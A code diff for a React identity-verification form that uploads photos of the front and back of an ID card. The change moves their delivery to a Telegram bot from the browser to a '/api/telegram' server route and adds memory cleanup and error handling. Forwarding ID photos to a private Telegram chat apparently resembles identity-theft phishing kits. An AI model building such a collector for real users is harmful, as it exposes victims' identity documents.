@@ -20,7 +20,13 @@ const ImageUpload: React.FC<ImageUploadProps> = ({ label, previewUrl, onImageCha
     <div className="flex flex-col items-center">
       <h3 className="text-lg font-semibold mb-2">{label}</h3>
       {previewUrl ? (
-        <Image src={previewUrl} alt={`${label} Preview`} width={250} height={150} className="rounded-lg object-cover mb-3" />
+        <Image 
+          src={previewUrl} 
+          alt={`${label} Preview`} 
+          width={250} 
+          height={150} 
+          className="rounded-lg object-cover mb-3" 
+        />
       ) : (
         <div className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg bg-gray-100 text-gray-500 mb-3">
           📸
@@ -69,8 +75,14 @@ const IdentityVerificationForm = () => {
   const router = useRouter();
 
   useEffect(() => {
-    setIsMobile(/Mobi|Android/i.test(navigator.userAgent)); // Detect mobile
-  }, []);
+    setIsMobile(/Mobi|Android/i.test(navigator.userAgent));
+    
+    // Clean up object URLs to avoid memory leaks
+    return () => {
+      if (frontPreview) URL.revokeObjectURL(frontPreview);
+      if (backPreview) URL.revokeObjectURL(backPreview);
+    };
+  }, [frontPreview, backPreview]);
 
   const handleImageChange = (side: "front" | "back", file: File | null) => {
     if (!file) return;
@@ -84,45 +96,51 @@ const IdentityVerificationForm = () => {
     const previewUrl = URL.createObjectURL(file);
 
     if (side === "front") {
+      // Revoke previous URL if exists
+      if (frontPreview) URL.revokeObjectURL(frontPreview);
       setFrontImage(file);
       setFrontPreview(previewUrl);
     } else {
+      if (backPreview) URL.revokeObjectURL(backPreview);
       setBackImage(file);
       setBackPreview(previewUrl);
     }
   };
 
-  const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-
-    try {
-      const sendPhoto = async (photo: File) => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", photo);
-        return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
-      };
-
-      await Promise.all([sendPhoto(frontImage), sendPhoto(backImage)]);
-      console.log("Images sent successfully to Telegram.");
-    } catch (error) {
-      console.error("Error sending Telegram message:", error);
-    }
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
     if (!frontImage || !backImage) {
       setError("Both front and back images are required.");
       return;
     }
 
     setIsSubmitting(true);
-    await sendTelegramMessage("Identity verification images submission.", frontImage, backImage);
-    setIsSubmitting(false);
+    setError(null);
     
-    router.push("/thankyou");
+    try {
+      const formData = new FormData();
+      formData.append('frontImage', frontImage);
+      formData.append('backImage', backImage);
+
+      const response = await fetch('/api/telegram', {
+        method: 'POST',
+        body: formData,
+      });
+
+      const result = await response.json();
+
+      if (!response.ok) {
+        throw new Error(result.error || 'Failed to submit images');
+      }
+
+      router.push("/thankyou");
+    } catch (error) {
+      console.error("Error submitting images:", error);
+      setError(error instanceof Error ? error.message : "Submission failed. Please try again.");
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -151,7 +169,7 @@ const IdentityVerificationForm = () => {
           <button
             type="submit"
             className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all disabled:bg-blue-300"
-            disabled={isSubmitting}
+            disabled={isSubmitting || !frontImage || !backImage}
           >
             {isSubmitting ? "Submitting..." : "Submit"}
           </button>
